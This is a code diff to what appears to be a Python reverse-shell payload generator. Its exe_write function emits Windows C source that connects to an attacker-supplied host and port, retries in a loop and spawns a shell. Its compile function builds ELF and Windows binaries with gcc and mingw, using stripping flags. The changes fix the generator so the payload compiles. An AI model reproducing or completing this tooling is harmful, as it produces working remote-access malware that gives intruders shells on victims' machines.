@@ -122,7 +122,7 @@ def elf_write(lhost,lport):
 
 def exe_write(lhost,lport):
 
-    file_name = "shell.cpp"
+    file_name = "revshell.c"
     f = open(file_name,"w")
     f.write("#include <stdio.h>\n")
     f.write("#include <stdlib.h>\n")
@@ -177,7 +177,7 @@ def exe_write(lhost,lport):
     f.write("unsigned short ServPort;\n")
     f.write("char *ServIP;\n")
     f.write("WSADATA wsaData;\n")
-    f.write(f"ServIP = {lhost};\n")
+    f.write(f"ServIP = \"{lhost}\";\n")
     f.write(f"ServPort = {lport};\n")
     f.write("if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)\n")
     f.write("{\n")
@@ -194,8 +194,8 @@ def exe_write(lhost,lport):
     f.write("Sleep(10);\n")
     f.write("goto start;\n")
     f.write("}\n")
-    f.write("Shell();")
-
+    f.write("Shell();\n")
+    f.write("}")
     del f
     return file_name
 
@@ -225,32 +225,24 @@ def compile(file_name,f_format):
 
     if f_format == "elf":
 
-        try:
-            compile_cmd = subprocess.getoutput(f"gcc {file_name} -o shell ")
+    
+        compile_cmd = subprocess.getoutput(f"gcc {file_name} -o shell ")
         
-            if "not found" in compile_cmd:
-                print("[!]Could not Use gcc")
-                print(bcolors.ENDC)
-                sys.exit()    
-
-        except:
-            print("[!]Execption Occured")
+        if "not found" in compile_cmd:
+            print("[!]Could not Use gcc")
             print(bcolors.ENDC)
-            sys.exit()
+            sys.exit()    
 
     elif f_format == "exe":
 
-        try:
-            compile_cmd = subprocess.getoutput(f"i686-w64-mingw32-g++ {file_name} -o shell.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
+        
+        compile_cmd = subprocess.getoutput(f"i686-w64-mingw32-g++ {file_name} -o shell.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
 
-            if "not found" in compile_cmd:
-                print("[!]Could not Use mingw")
-                print(bcolors.ENDC)
-                sys.exit()
-        except:
-            print("[!]Exception Occured")
+        if "not found" in compile_cmd:
+            print("[!]Could not Use mingw")
+            print(bcolors.ENDC)
             sys.exit()
-
+        
     print("[+]Compile....Done")
     print(bcolors.ENDC)
 if __name__ == "__main__":
